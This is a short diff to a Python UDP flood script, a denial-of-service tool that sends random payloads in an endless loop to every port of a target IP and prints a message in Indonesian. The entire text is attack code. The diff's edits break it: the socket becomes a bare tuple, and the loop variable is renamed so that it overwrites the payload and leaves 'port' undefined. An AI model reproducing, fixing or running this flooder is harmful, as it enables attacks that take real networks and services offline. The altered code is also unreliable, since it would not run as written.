@@ -8,7 +8,7 @@ B = '\033[1m'
 R = '\033[31m'
 N = '\033[0m'
 
-white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+white = (socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(666)
 bytes = random._urandom(666)
 bytes = random._urandom(666)
@@ -27,7 +27,7 @@ time.sleep(3)
 print("Dalam Waktu 1menit")
 while True:
     sent = 0
-    for port in range(1, 65534):
+    for bytes in range(1, 65534):
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         sent == 65534
